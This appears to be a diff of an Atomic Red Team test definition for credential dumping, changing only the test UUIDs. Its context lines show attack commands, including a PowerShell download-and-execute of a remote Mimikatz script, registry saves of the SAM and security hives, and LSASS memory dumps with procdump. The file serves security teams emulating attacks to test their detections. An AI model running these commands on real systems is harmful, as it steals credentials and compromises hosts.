@@ -4,7 +4,7 @@ display_name: Credential Dumping
 
 atomic_tests:
 - name: Powershell Mimikatz
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: 44edbf70-714b-4d51-bae2-fd6f1ee7ebf6
 
   description: |
     Dumps Credentials via Powershell by invoking a remote mimikatz script
@@ -21,7 +21,7 @@ atomic_tests:
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
 - name: Gsecdump
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: 0428e1c1-3408-4ed6-9e4c-4c360cd3cbc0
 
   description: |
     https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
@@ -33,7 +33,7 @@ atomic_tests:
       gsecdump -a
 
 - name: Windows Credential Editor
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: a0458da2-9909-4e02-8d40-453e34dc4503
 
   description: |
     http://www.ampliasecurity.com/research/windows-credentials-editor/
@@ -50,7 +50,7 @@ atomic_tests:
       wce -o #{output_file}
 
 - name: Registry dump of SAM, creds, and secrets
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: 98ab69c5-be3c-41e9-aff8-c7a08313d91a
 
   description: |
     Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
@@ -65,7 +65,7 @@ atomic_tests:
       reg save HKLM\security security
 
 - name: Dump LSASS.exe Memory using ProcDump
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: 8ca6632d-aaad-441a-844c-b9dc3c002f63
 
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -83,7 +83,7 @@ atomic_tests:
       procdump.exe -accepteula -ma lsass.exe #{output_file}
 
 - name: Dump LSASS.exe Memory using Windows Task Manager
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: 676ebe2a-8d3f-449f-aaca-8df173229a44
 
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
@@ -106,7 +106,7 @@ atomic_tests:
 
 
 - name: Offline Credential Theft With Mimikatz
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: 29b548a1-19e1-48f9-aa75-2fed99f1d14d
 
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
@@ -131,7 +131,7 @@ atomic_tests:
         Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
 
 - name: Dump Active Directory Database with NTDSUtil
-  uuid: 9231f8f5-87ca-437c-8874-790bcca801f6
+  uuid: ea247c09-c9de-493b-b7bd-ce6810f485b7
 
   description: |
     The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
